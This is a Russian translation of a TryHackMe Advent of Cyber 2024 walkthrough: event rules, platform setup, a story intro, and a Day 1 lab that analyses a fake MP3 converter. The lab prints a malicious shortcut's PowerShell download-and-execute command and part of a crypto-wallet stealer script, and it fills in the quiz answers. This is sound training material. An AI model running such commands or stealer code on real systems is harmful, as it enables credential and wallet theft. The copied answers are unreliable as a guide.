[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Advent of Cyber 2024](https://tryhackme.com/r/room/adventofcyber2024) 

Всего 32 задания:
## Задание 1
Добро пожаловать в Advent of Cyber 2024!
Сможете ли вы в этом году в Advent of Cyber помочь Макскиди и Глюку защитить SOC -mas от планов злого мэра Малваре?

Погрузитесь в удивительный мир кибербезопасности, выполняя праздничные упражнения для новичков каждый день в 
преддверии Рождества! 

Advent of Cyber доступен всем пользователям TryHackMe, и, что самое приятное, участие в нем бесплатное.  У вас также 
будет шанс выиграть в этом году огромный призовой розыгрыш в размере 100 000 долларов . Чем больше вопросов вы 
ответите, тем выше ваши шансы на КРУПНЫЙ выигрыш!

Представьте себе это как рождественский календарь, но с захватывающими (и праздничными) заданиями по безопасности 
вместо шоколада. 

#### Главные призы
В этом году нас ждет самый крупный и лучший розыгрыш призов:  общая сумма призов превышает 100 000 долларов !

В этом событии количество вопросов, на которые вы ответите, действительно имеет значение! За каждый вопрос, на 
который вы ответите правильно, вы получите лотерейный билет. Чем больше лотерейных билетов вы соберете, тем выше 
ваши шансы на крупный выигрыш!

Чтобы получить шанс выиграть главный приз — билеты на DEF CON с проживанием, вам нужно будет выполнить все задания 
в этой комнате до 31 декабря! Это также принесет вам сертификат о завершении.

Вот призы, которые можно выиграть:

- 15x монитор Samsung ($300.00)	7x Рюкзак GRID ($225.00)
- 20 наушников JBL ($130.00)	15 фирменных рюкзаков из хлопчатобумажной ткани ($65.00)
- 4x Наушники Sony ($450.00)	3x PAC-MAN™ Deluxe Аркадная игра ($500.00)
- 5 стульев для письменного стола ($249.00)	20 больших органайзеров Arlo Tech ($70,00)
- 20 комплектов Sidekick Tech Kit ($50.00)	15 фирменных наушников Apple AirPods Pro (2-го поколения) ($300,00)
- 10x Apple TV 4K 64 ГБ (3-го поколения) ($149.00)	10 персонализированных классических вещей Catch:3, итальянская 
  кожа ($190,00)
- 15x Clutch® Pro USB-C для Android и iPhone 15+ ($50.00)	Подписка на 500 THM (1 месяц) ($14.00)
- 5 эспрессо-машин с помпой Stilosa на 15 бар (150 долларов США)	Подписка на 300 THM (3 месяца) ($42.00)
- 5 игровых досок Infinity Game Board™ ($500.00)	Подписка на 25 тайских манатов (6 месяцев) ($84,00)
- 20 фирменных зарядных устройств MagSafe ($45.00)	Подписка на 5 THM (12 месяцев) ($126.00)
- 5x Duo Standing Desk ($499.00)	400 подарочных карт TryHackMe Swag (10,00 $)
- 10x Nintendo Switch 32 ГБ Lite ($250.00)	300 подарочных карт TryHackMe Swag ($20,00)
- Модель Switch OLED с тремя OLED-дисплеями и неоново-красным и неоново-синим Joy-Con ($420,00)	150 подарочных карт 
  TryHackMe Swag (50 долл. США) (50,00 долл. США)
- 10 солнечных зарядных устройств и аварийная радиостанция ($50.00)	80x подарочных карт TryHackMe Swag ($75) ($75.00)
- 2x PlayStation VR2 ($600.00)	20 подарочных карт TryHackMe Swag (100 долл. США) (100,00 долл. США)
- 5x наружных Bluetooth-динамиков Beosound Explore ($249,00)	200 карточек Hacktivity ($20.00)
- 10 очков Therabody SmartGoggles ($199.00)	5x DEF CON ($460.00)
- 10x Ornata V3 полноразмерная проводная игровая клавиатура с меха-мембраной и подсветкой Chroma RGB ($79.00)	
  ГЛАВНЫЙ ПРИЗ: 3x DEF CON + проживание (1500,00 долл. США)

Все победители будут выбраны случайным образом, проверены нашей командой (мошенничество не допускается!) и объявлены 
в понедельник, 6 января 2025 года. 

#### Общие правила
Нарушение любого из следующих правил приведет к исключению из мероприятия:

- .tryhackme.com и сервер OpenVPN недоступны для зондирования, сканирования или эксплуатации
- Пользователям разрешено взламывать только те машины, которые размещены в комнатах, к которым у них есть доступ.
- Пользователи не должны нападать на других пользователей или преследовать их.
- Пользователи должны войти на мероприятие только один раз, используя одну учетную запись.
- Ответы на вопросы не подлежат разглашению, если они не показаны на видео/трансляциях.
Обман
- Использование аккаунтов ботов
- Условия розыгрыша призов можно найти на этой  странице .

Обратите внимание: мошенничество НЕ допускается и приведет к дисквалификации с мероприятия Advent of Cyber. Все 
победители будут полностью проверены. Это включает в себя, в частности: 

- создание подставных аккаунтов для увеличения шансов на победу
- использование ботов для автоматического заполнения ответов в комнате
#### Как пройти квалификацию
Чтобы получить главные призы, вы должны ответить на вопросы в заданиях Advent of Cyber 2024, начиная с Дня 1 
(Задание 7 этой комнаты). Только ответы на вопросы в комнате Advent of Cyber 2024 позволят вам принять участие в 
розыгрыше.  

Неважно, когда вы выполните задания. Вам просто нужно выполнить их до 31 декабря 2024 года. Например, если вы 
выполните вопросы из Дня 1 31 декабря 2024 года, вы все равно получите такое же количество лотерейных билетов, как и 
пользователь, который выполнит задания в день их публикации!
Вам не обязательно отвечать на все вопросы или по порядку. Чем больше вопросов вы ответите, тем больше лотерейных 
билетов вы получите и тем выше ваши шансы на победу.
Пожалуйста, посетите эту  страницу,  чтобы ознакомиться с подробными Условиями и положениями лотереи.
ВАЖНОЕ ПРИМЕЧАНИЕ: Лотерейные билеты не будут видны в вашем профиле. Количество лотерейных билетов всегда равно 
количеству вопросов, на которые вы ответили в этой комнате.

Сертификат и значок
Наконец, если вы выполните все задания в мероприятии, вы получите сертификат о завершении и значок! Поскольку ваше 
имя будет включено в сертификат, мы советуем убедиться, что ваше полное имя указано (и обновлено) в  вашем профиле.


Избранные видео
Каждая выпущенная задача сопровождается видеоруководством, которое поможет вам пройти ее. Вы можете ожидать увидеть 
некоторых из ваших любимых создателей видео по кибербезопасности. Видео последнего дня будет отображаться в верхней 
части комнаты, но все видео будут доступны в соответствующем контенте задачи.

В этом году на Advent of Cyber будут представлены такие создатели, как 0day, UnixGuy, Джеральд Оже, Тайлер Рамсби, 
Bearded IT Dad, Day Cyberwox, Маркус Хатчинс, Дэвид Алвес, InsiderPHD, Tib3rius,  Джош Мейсон , Cyb3rMaddy и другие!

### Ответьте на вопросы ниже
Я прочитал(а) правила и условия розыгрыша. 
```commandline
Ответ не нужен
```

## Задание 2
Присоединяйтесь к нашему сообществу
Подпишитесь на нас в социальных сетях, чтобы получать эксклюзивные призы, узнавать о заданиях Advent of Cyber и 
анонсировать розыгрыш призов!

Подпишитесь на нас в LinkedIn !
Станьте частью нашего сообщества и присоединяйтесь к нашему  Discord !
Подпишитесь на нас в X,  чтобы получать ежедневные публикации с заданиями!
Присоединяйтесь к нам в Instagram ! 
Подпишитесь на нас в Facebook !
Присоединяйтесь к нашему растущему сабреддиту !
Подписывайтесь на наши TikTok !

Присоединяйтесь к нашему Discord
Discord — это сердце сообщества TryHackMe. Это место, где мы общаемся с другими хакерами, получаем помощь в сложных 
комнатах и узнаем, когда открывается новая комната. На нашем сервере Discord более 220 000 участников (и их число 
продолжает расти с каждым днем), поэтому здесь всегда что-то происходит.

Вы в восторге от Advent of Cyber? Посетите специальный канал на нашем Discord, где вы сможете пообщаться с другими 
участниками мероприятия и следить за ежедневными релизами!

Если вы им раньше не пользовались, настроить его очень просто (рекомендуем установить приложение). Мы зададим 
несколько вопросов для начала работы, чтобы помочь вам понять, какие каналы наиболее актуальны для вас.

Что вы получаете с Discord?
Присоединение дает множество преимуществ:

- Обсудите текущие проблемы «Наступления киберпространства» и получите поддержку на специальном канале.
- Узнайте, как улучшить свои заявления о приеме на работу и ускорить свой путь к киберкарьере.
- Узнайте о предстоящих мероприятиях и испытаниях TryHackMe.
- Просмотрите форумы для обсуждения всех наших учебных программ и выпусков.
Нажмите на эту ссылку, чтобы присоединиться к нашему серверу Discord:  Присоединяйтесь к сообществу!

Хватайте свою добычу!
Хотите представить сувениры с вашей любимой платформы обучения кибербезопасности? У нас есть НОВЫЙ специальный 
выпуск Advent of Cyber swag, который теперь доступен для заказа!



### Ответьте на вопросы ниже
Присоединяйтесь к нашему Discord и поздоровайтесь!

```commandline
Ответ не нужен
```
Есть ли специальный канал Advent of Cyber на TryHackMe Discord, где пользователи могут обсуждать ежедневные задачи и 
получать специальную поддержку? (да/нет) 

```commandline
yes
```
Подпишитесь на нас в  LinkedIn !

```commandline
Ответ не нужен
```
Подпишитесь на нас в  X !

```commandline
Ответ не нужен
```
Загляните на  сабреддит !

```commandline
Ответ не нужен
```
Присоединяйтесь к нам в  Instagram ! 

```commandline
Ответ не нужен
```
Подпишитесь на нас в  Facebook !

```commandline
Ответ не нужен
```
Подписывайтесь на наши  TikTok !

```commandline
Ответ не нужен
```
```commandline
Ответ не нужен
```

## Задание 3
Завершение Advent of Cyber как организации
С TryHackMe для бизнеса вы:

- Получите полный неограниченный доступ ко всему контенту и функциям TryHackMe (за исключением облачного контента и 
SOC Sim)
- Используйте конкурентное обучение и коллективно вовлекайте свою команду в выполнение задач Advent of Cyber, 
  оценивая их прогресс
- Создавайте индивидуальные учебные планы, чтобы углубить знания по темам Advent of Cyber и не только
- Обучение для команд по защите, наступлению и безопасности облачных вычислений
- Расширенные административные отчеты и панели мониторинга
- Поддержка внедрения для вашей организации, интеграция SSO и менеджер по работе с клиентами
- Создавайте собственные  события «Захват флага»  по запросу!
Если вы заинтересованы в изучении бизнес-преимуществ TryHackMe с помощью БЕСПЛАТНОЙ пробной версии, пожалуйста, 
  свяжитесь  с sales@tryhackme.com . Для получения дополнительной информации о нашем предложении посетите  
  бизнес-страницу.

Если вы являетесь нашим постоянным клиентом и хотите привлечь к участию более широкую команду и компанию, обратитесь 
к своему персональному менеджеру по работе с клиентами!

### Ответьте на вопросы ниже
Соберите свою команду для совместной работы над Advent of Cyber! 
```commandline
Ответ не нужен
```

## Задание 4
Короткий урок TryHackMe
Новые задания публикуются ежедневно в 16:00 по Гринвичу, а первое задание будет опубликовано 1 декабря. Они будут 
различаться по сложности (хотя они всегда будут нацелены на новичков). Каждое задание в событии будет включать 
инструкции по взаимодействию с практическим материалом. Пожалуйста, внимательно следуйте им! Инструкции будут 
включать карту подключения, похожую на ту, что показана ниже:

Изображение примера карты подключения, показывающее доступные варианты подключения

Давайте рассмотрим различные варианты.

Если доступна опция AttackBox:

AttackBox от TryHackMe — это  виртуальная машина Ubuntu, размещенная в облаке. Представьте себе AttackBox как 
виртуальный компьютер, который вы используете для проведения мероприятий по обеспечению безопасности. Во время 
мероприятия будет несколько задач, которые потребуют от вас развертывания AttackBox.

Вы можете развернуть AttackBox, нажав кнопку «Запустить AttackBox» в верхней части этой страницы.

Используя веб-ориентированный AttackBox, вы можете выполнять упражнения через браузер. Если вы постоянный 
пользователь, вы можете развернуть AttackBox  бесплатно на 1 час в день.  Если вы  подписаны , вы можете развернуть 
его на неограниченное количество времени!

Обратите внимание, что вы можете использовать свою собственную атакующую машину вместо AttackBox. В этом случае вам 
нужно будет подключиться с помощью OpenVPN. Инструкции по настройке OpenVPN  здесь.

Вы можете открыть AttackBox в полноэкранном режиме на новой вкладке с помощью этой кнопки:

Кнопка полноэкранного режима расположена в левом нижнем углу окна разделенного экрана.

Если доступна опция VM :

Большинство задач в Advent of Cyber будут иметь прикрепленную к ним виртуальную машину. Вы будете использовать 
некоторые из них в качестве целей для тренировки навыков наступательной безопасности, а некоторые — в качестве 
хостов для анализа и расследований. Если эта опция доступна, вам нужно нажать кнопку «Запустить машину».

После развертывания машины вы увидите, как в верхней части комнаты появится рамка. Она будет отображать некоторую 
важную информацию, например IP-адрес целевой машины, а также опции для продления таймера машины или его завершения.



Если доступна опция разделения экрана:

Некоторые задачи позволят вам просматривать развернутую виртуальную машину в режиме разделенного экрана. Обычно, 
если эта опция включена, разделенный экран открывается автоматически. Если этого не происходит, вы можете нажать эту 
кнопку в верхней части страницы, чтобы открыть разделенный экран.



Обратите внимание, что вы можете открыть виртуальные машины с разделенным экраном на другой вкладке с помощью этой 
кнопки: 

Кнопка полноэкранного режима расположена в левом нижнем углу окна разделенного экрана.

Если есть прямая ссылка:

Некоторые виртуальные машины позволяют просматривать необходимый контент прямо в другой вкладке браузера. В этом 
случае вы сможете увидеть ссылку на виртуальную машину прямо в содержимом задачи.



Обратите внимание: для работы ссылки сначала необходимо развернуть виртуальную машину, прикрепленную к задаче.

Если доступна возможность прямого подключения:

Некоторые задачи позволят вам подключиться к виртуальным машинам, подключенным с помощью RDP, SSH или VNC. Это 
всегда необязательно, и виртуальные машины с этой возможностью также будут доступны через разделенный экран. В этих 
случаях будут предоставлены учетные данные для входа, как на изображении ниже:

В случае предоставления учетных данных они будут отображены в виде открытого текста и встроены в содержимое комнаты.

Мы предоставляем это, поскольку некоторые пользователи могут предпочесть подключение напрямую. Однако, обратите 
внимание, что некоторые задачи намеренно отключат эту опцию. Если учетные данные не указаны, прямое подключение 
невозможно.

### Ответьте на вопросы ниже
Понятно! 
```commandline
Ответ не нужен
```

## Задание 5
Как Глюк украл SOC -mas


Снег падает на технологический город Уэрвилл, и все разные семьи Уэр собираются на городской площади, готовясь к 
городскому собранию. Мы видим, как Софтверы и Свободные ПО катаются по неоновым морозным полосам. Мы поворачиваем на 
Серверную улицу и видим, как Аппаратные и Прошивочные ПО маршируют в центр города, праздничные серверные огни мигают 
и мерцают в их глазах. Пора начинать готовиться к SOC -mas , самому радостному времени года в технологическом городе 
Уэрвилл.

Если мы поднимем глаза, то увидим за шумным городом заснеженную гору выброшенной техники. Валуны старых принтеров, 
потрескавшиеся скалы мониторов и хребты серверных стоек, скрепленные лозами кабелей Ethernet, и одинокое старое 
игровое кресло на вершине — это гора Хакит, и ни один Уорс не осмеливается туда подняться. Они боятся ее не из-за 
частых лавин дискет, Уорс избегает горы Хакит из-за Глюка.

Логово Глитча спрятано в глубокой пещере, и он сейчас там. Он хватает несколько кабелей, свисающих с потолка, и 
подключает их. Хотя они не такие новые и блестящие, как у Уорвилля, его серверы работают просто отлично! Глитч 
следит за безопасностью Уорвилля уже много лет, и этот SOC -mas не будет исключением. Уорсы могут бояться Глитча, 
думая, что он злой хакер, но это неважно. Щелкнув пальцами, он начинает печатать, устанавливая соединение с 
городской сетью. Время для взлома!

На городской площади Марта Мэй Уэр, организатор SOC -mas, поднимается на сцену, чтобы обратиться к городу, когда все 
огни внезапно мерцают. Все Уэры оглядываются, сбитые с толку, но это быстро проходит, и все возвращается на круги 
своя.

В здании муниципалитета мэр Малваре бьёт кулаками по столу. «Опять заблокировано!» — сердито кричит он. «Этот 
невыносимый Глюк снова взялся за дело!» План мэра остановить подготовку SOC-mas путём саботажа сегодняшнего 
заседания не удался. Ему придётся придумать что-то получше на завтра…

Тем временем в SOC Уорвилла царит хаос. Аналитики пытаются выяснить, что вызвало внезапный скачок напряжения, 
который поставил под угрозу всю технику в городе. McSkidy Software, ведущий эксперт по кибербезопасности города, 
указывает на файл журнала на экране и восклицает: «Теперь я не знаю точно, что произошло, но это доказывает, что у 
нас было соединение с горы Хакит!» McSkidy выбегает из SOC и направляется на гору. Когда она достигает пещеры, она 
не ожидает увидеть Глюка, ожидающего ее, с двумя чашками горячего какао в руках и с собакой, свернувшейся у его ног.

Это занимает большую часть вечера, но Глюк объясняет, чем он занимается: защищает город от злых планов мэра Малвара. 
Похоже, мэр хочет полностью остановить SOC -mas в этом году! Глюк знает, что Вэры могут не доверять ему или 
ненавидеть его, но он хочет помочь.

Теперь, объединенные общей целью, Макскиди и Глюк начинают свою работу в пещере горы Хакит, потому что они 
единственные, кто стоит между Уорвиллем и хаосом.

Возвращайтесь 1 декабря, чтобы помочь МакСкиди и Глюку защитить SOC -mas от планов злого мэра Малваре!

### Ответьте на вопросы ниже
Звучит серьезно! Я буду здесь, чтобы помочь Глюку 1 декабря!


```commandline
Ответ не нужен
```
## Задание 6
Оформите подписку со скидкой!
Событие Advent of Cyber полностью бесплатное! Однако мы рекомендуем ознакомиться с некоторыми причинами, по которым 
стоит подписаться:

Чтобы отпраздновать Advent of Cyber, вы можете получить скидку 30% на персональные годовые подписки, используя код 
скидки  AOC2024 при оформлении заказа. Эта скидка действительна до 31 декабря 2024 года, 23:59 GMT – это в: 


### Ответьте на вопросы ниже
Поделитесь скидкой с друзьями! 
```commandline
Ответ не нужен
```

## Задание 7
История

Баннер задач на день ДЕНЬ 1

Макскиди стучал по клавишам с уверенной ухмылкой,
Подозрительный веб-сайт. С чего начать?
Она видела такие сайты, полные кода и грязи,
Сомнительные домены и легкодоступные ориентиры.
Нажмите здесь, чтобы посмотреть видео-обучение!


Пальцы Макскиди летали по клавиатуре, ее глаза сузились, когда она увидела подозрительный веб-сайт на экране. Она 
видела десятки подобных вредоносных кампаний. На этот раз след привел прямо к человеку под именем «Glitch».

«Слишком просто», — пробормотала она с ухмылкой.

«У меня еще есть время», — сказала она, наклоняясь ближе к экрану. «Может быть, есть еще».

Она и не подозревала, что под поверхностью скрывается нечто гораздо более сложное, чем простое хакерское имя. Это 
было лишь начало запутанной паутины, распутывающей все, что она думала, что знает.

Иллюстрация, изображающая Макскиди перед домом.

#### Цели обучения
- Узнайте, как исследовать вредоносные файлы ссылок.
- Узнайте об OPSEC и ошибках OPSEC .
- Узнайте, как отслеживать и атрибутировать цифровые идентификационные данные при киберрасследованиях.

Подключение к машине
Прежде чем двигаться дальше, просмотрите вопросы в карточке подключения, показанной ниже, и запустите виртуальную 
машину, нажав кнопку Start Machine . Виртуальная машина должна быть полностью загружена через 3 минуты. Кроме того, 
вам понадобится AttackBox, который можно запустить, нажав кнопку Start AttackBox в верхней части страницы.


Запустить машину
ПРИМЕЧАНИЕ: 

Если вы нажимаете «Запустить машину» и сталкиваетесь с проблемой при ее запуске, не волнуйтесь — это просто высокий 
спрос. Что можно сделать?

Продолжайте пытаться! Машины становятся доступными, поскольку спрос колеблется.
Если у вас все еще возникают проблемы, вернитесь немного позже, когда людей будет меньше.
Баннер, демонстрирующий варианты подключения, представленные в этой комнате.

Исследование веб-сайта
Веб-сайт, который мы расследуем, — это конвертер Youtube в MP3, который в настоящее время распространяется среди 
организаторов SOC-mas. Вы решили копнуть глубже, услышав некоторые тревожные сообщения об этом веб-сайте.

Скриншот сайта.

С помощью AttackBox зайдите на веб-сайт, перейдя по адресу MACHINE_IP с помощью веб-браузера.

На первый взгляд сайт выглядит законным и презентабельным. На странице «О нас» даже написано, что он создан «The 
Glitch». Как любезно с их стороны облегчить нам работу!

Прокрутив вниз, вы увидите список функций, который обещает быть «Безопасным» и «Надежным». По нашему опыту, это 
маловероятно.

Сайты конвертеров YouTube в MP3
Эти сайты существуют уже давно. Они предлагают удобный способ извлечения аудио из видео YouTube, что делает их 
популярными. Однако исторически эти сайты были замечены как имеющие значительные риски, такие как:

- Вредоносная реклама : многие сайты содержат вредоносную рекламу, которая может использовать уязвимости в системе 
пользователя, что может привести к заражению.
- Фишинговые атаки : пользователи могут быть обмануты и получить личную или конфиденциальную информацию с помощью 
  поддельных опросов или предложений.
- Встроенное вредоносное ПО : некоторые конвертеры могут поставляться с вредоносным ПО, заставляя пользователей 
  неосознанно запускать его.
- Какую гнусность приготовил для нас этот сайт?

Получаем некоторые мелодии
Давайте выясним это, вставив любую ссылку YouTube в форму поиска и нажав кнопку «Конвертировать». Затем выберите 
любой mp3 or mp4из вариантов. Это должно загрузить файл, который мы могли бы использовать для исследования. Например,
мы можем использовать https://www.youtube.com/watch?v=dQw4w9WgXcQ , классику, если вы меня спросите.

После загрузки перейдите в папку Downloads или, если вы используете AttackBox, в каталог /root/. Найдите файл с 
именем download.zip, щелкните его правой кнопкой мыши и выберите Extract To . В диалоговом окне нажмите кнопку 
Extract , чтобы завершить извлечение.

Скриншот, демонстрирующий распаковку zip-архива.

Теперь вы увидите два извлеченных файла: song.mp3и somg.mp3.

Чтобы быстро определить содержимое файла, дважды щелкните значок «Терминал» на рабочем столе, затем выполните 
fileкоманду для каждого из них. Сначала попробуем проверить song.mp3. 

Проверить файл 1 терминал
```commandline
user@tryhackme:~$ file song.mp3
download.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```

Вроде бы ничего подозрительного, судя по выходу. Как и ожидалось, это просто файл MP3.

А как насчет второго файла somg.mp3? По одному имени файла можно сказать, что что-то не так. Но давайте все равно 
проверим, запустив file команду на нем. 

Проверить файл 2 терминала
```commandline
user@tryhackme:~$ file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
```
А вот это уже интереснее!

Вывод сообщает нам, что вместо MP3 файл является "ярлыком MS Windows", также известным как  .lnk файл. Этот тип файла 
используется в Windows для ссылки на другой файл, папку или приложение. Эти ярлыки также могут использоваться для 
запуска команд! Если вы когда-либо видели ярлыки на рабочем столе Windows, вы уже знаете, что это такое.

Существует несколько способов проверки .lnk  файлов для выявления встроенных команд и атрибутов. Однако для этой 
комнаты мы будем использовать ExifTool , который уже установлен на этой машине.

Для этого вернитесь в Терминал и введите:

Использование терминала Exiftool
```commandline
user@tryhackme:~$ exiftool somg.mp3
```

Просмотрите вывод, чтобы найти команду, используемую в качестве ярлыка в somg.mp3 файле. Если вы прокрутите вывод 
вниз, вы должны увидеть команду PowerShell.

Использование терминала Exiftool
```commandline
...
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
user@tryhackme:~# 
```

Что делает эта команда PowerShell :

- Флаги -ep Bypass -nopотключают обычные ограничения PowerShell, позволяя выполнять скрипты без вмешательства 
настроек безопасности или профилей пользователей.
- Метод DownloadFileизвлекает файл (в данном случае IS.ps1) с удаленного сервера ( https://raw.githubusercontent.
  com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1 ) и сохраняет его в C:\\ProgramData\\каталоге на целевой машине.
- После загрузки скрипт выполняется с помощью PowerShell с помощью iex команды, которая запускает загруженный s.ps1 
  файл.
- Если вы откроете содержимое файла для загрузки с помощью браузера ( https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1), вы увидите, как нам повезло, что мы сейчас не используем Windows.

PowerShell
Скриптовый терминал 
```commandline
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

[Output truncated for brevity]
```

Скрипт предназначен для сбора конфиденциальной информации из системы жертвы, такой как криптовалютные кошельки и 
сохраненные учетные данные браузера, и отправки ее на удаленный сервер злоумышленника.

Отказ от ответственности:  Весь контент в этой комнате, включая код CPP, скрипты PowerShell и команды, 
предоставляется исключительно в образовательных целях. Пожалуйста, не запускайте их на хосте Windows.

Это выглядит довольно типично для сценария PowerShell такого назначения, за одним заметным исключением: сигнатура в коде, которая гласит.

Создано единственным и неповторимым ММ

Поиск источника
Есть много путей, по которым мы могли бы продолжить наше расследование. Мы могли бы исследовать веб-сайт дальше, 
проанализировать его исходный код или поискать открытые каталоги, которые могли бы раскрыть больше информации о 
настройках злоумышленника. Мы можем поискать хэш или сигнатуру в общедоступных базах данных вредоносных программ, 
таких как VirusTotal или Any.Run. Каждый из этих методов может дать полезные подсказки.

Однако для этой комнаты мы попробуем что-то немного другое. Поскольку у нас уже есть код PowerShell, его поиск в 
сети может дать нам полезные наводки. Это далекая попытка, но мы рассмотрим ее в этом упражнении. 

Есть много мест, где мы можем искать код. Наиболее широко используемым является Github. Давайте попробуем поискать там.

Для эффективного поиска мы можем искать уникальные части кода, которые мы могли бы использовать для поиска. Чем 
более отличительные, тем лучше. Для этого сценария у нас есть строка, которую мы обнаружили ранее, которая гласит:

«Создано единственным и неповторимым ММ»

Найдите это на Github.com или перейдя по этой ссылке:  https://github.com/search?q=%22Created+by+the+one+and+only+MM%22&type=issues

Страница результатов поиска GitHub на основе указанных ключевых слов.

Вы заметите кое-что интересное, если изучите страницы в результатах поиска.

Примечание!
Если вы получили сообщение об ошибке ниже, это связано с тем, что на Github действуют ограничения скорости, если вы 
не вошли в систему. Чтобы исправить это, вы можете просто войти в систему с помощью учетной записи GitHub или 
перейти сразу к следующему шагу, перейдя по ссылке: https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1   

Сообщение об ошибке GitHub, предлагающее пользователю войти в систему для доступа к ресурсу.

Если просмотреть результаты поиска, то можно будет сделать вывод о личности злоумышленника на основе информации на 
странице проекта и в разделе GitHub Issues. 

Комментарий MM на GitHub по поводу упомянутого проекта, раскрывающий его личность.

Ага! Похоже, этот пользователь совершил критическую ошибку.

#### Введение в OPSEC
Это классический случай провала OPSEC .

Операционная безопасность ( OPSEC ) — термин, изначально придуманный в армии для обозначения процесса защиты 
конфиденциальной информации и операций от противников. Цель состоит в том, чтобы выявить и устранить потенциальные 
уязвимости до того, как злоумышленник сможет узнать их личность.

В контексте кибербезопасности, когда злоумышленники не следуют надлежащим практикам OPSEC , они могут оставлять 
цифровые следы, которые можно собрать воедино, чтобы раскрыть их личность. Вот некоторые распространенные ошибки 
OPSEC :

- Повторное использование имен пользователей, адресов электронной почты или учетных записей на нескольких платформах. 
Можно было бы предположить, что любой, кто пытается скрыть свои следы, удалит такую очевидную и компрометирующую 
  информацию, но иногда это происходит из-за тщеславия или просто забывчивости.
- Использование идентифицируемых метаданных в коде, документах или изображениях, которые могут раскрывать личную 
  информацию, такую как имена устройств, координаты GPS или временные метки.
- Публичное размещение информации на форумах или GitHub (как в текущем сценарии) с подробностями, которые связывают 
  их с их настоящей личностью или раскрывают их местонахождение или привычки.
- Неиспользование VPN или прокси-сервера при осуществлении вредоносной деятельности позволяет правоохранительным 
  органам отслеживать реальный IP-адрес злоумышленника.
- Можно было бы подумать, что человек, совершивший что-то плохое, сделает OPSEC своим главным приоритетом, но они 
  всего лишь люди и тоже могут совершать ошибки.

Например, вот несколько реальных ошибок OPSEC , которые привели к действительно крупным провалам:

Удаление администратора AlphaBay
Один из самых громких провалов OPSEC произошел с Александром Казесом, администратором AlphaBay, одной из крупнейших 
торговых площадок даркнета:

- В первых приветственных письмах с сайта Казес использовал адрес электронной почты « pimp_alex_91@hotmail.com ».
- В этом электронном письме был указан год его рождения и другая идентифицирующая информация.
- Он обналичил деньги, используя биткойн-счет, привязанный к его настоящему имени.
- Казес повторно использовал имя пользователя «Alpha02» на нескольких платформах, связывая свою личность в даркнете с 
  сообщениями на форуме под своим настоящим именем.


Китайская военная хакерская группа (APT1)
Есть также печально известная китайская хакерская группа APT1, которая допустила несколько ошибок OPSEC :

- Один из участников, Ван Дун, подписал свой вредоносный код псевдонимом «Ugly Gorilla».
- Этот псевдоним был связан с сообщениями на форуме по программированию, связанными с его настоящим именем.
- Группа использовала предсказуемые соглашения об именах пользователей, кодов и паролей.
- Их деятельность постоянно совпадала с рабочим временем Пекина, что делало их местонахождение очевидным.
- Эти сбои предоставили исследователям в области кибербезопасности и правоохранительным органам достаточно информации 
  для публичной идентификации членов группы.

Раскрытие ММ
Если вы тщательно изучили результаты поиска GitHub, вы должны были обнаружить несколько улик, основанных на 
ненадлежащих методах обеспечения безопасности (OPSEC) со стороны злоумышленника.

Мы знаем, что злоумышленник оставил отличительную подпись в коде PowerShell (MM). Это позволило нам искать связанные 
репозитории и страницы проблем на GitHub. Затем мы обнаружили страницу проблем, где злоумышленник участвовал в 
обсуждениях, предоставляя больше контекста и связывая свою деятельность с другими проектами.

Иллюстрация особняка со ступенями, ведущими к нему.

В этом обсуждении они ответили на вопрос об изменении кода. Этот ответ, в сочетании с их уникальным ником, был еще 
одной критической ошибкой, оставившей за собой след доказательств, который можно отследить до них. Анализируя 
временные метки, имена пользователей и характер их взаимодействий, мы теперь можем приписать организатора атаки MM.

Что дальше?
МакСкиди копала глубже,  ее ум был острым и быстрым,
Но что-то было не так, какой-то странный трюк.
Собранные ею части просто не совпадали,
Головоломка с пробелами, запутанный дизайн.
По мере того, как Макскиди продолжала копать, возникла закономерность, которая не соответствовала образу, который 
она собирала по кусочкам. В неясных местах, глубоко зарытых в деталях, появился другой ник: «ММ».

«Кто такой ММ?» — пробормотал Макскиди, и таинственность стала еще глубже.

Хотя все признаки на сайте, казалось, указывали на Глитча как на автора, стало ясно, что кто-то приложил немало 
усилий, чтобы имя Глитча появилось везде. Однако разбросанные следы, оставленные ММ, свидетельствовали о 
преднамеренной попытке переложить вину.

### Ответьте на вопросы ниже
Похоже, файл song.mp3 не такой, как мы ожидали! Запустите "exiftool song.mp3" в терминале, чтобы узнать автора песни.
Кто автор?  
```commandline
Tyler Ramsbey
```
Вредоносный скрипт PowerShell отправляет украденную информацию на сервер C2. Каков URL этого сервера C2?
```commandline
http://papash3ll.thm/data
```
Кто такой ММ? Может быть, его страница профиля на Github даст подсказки?
```commandline
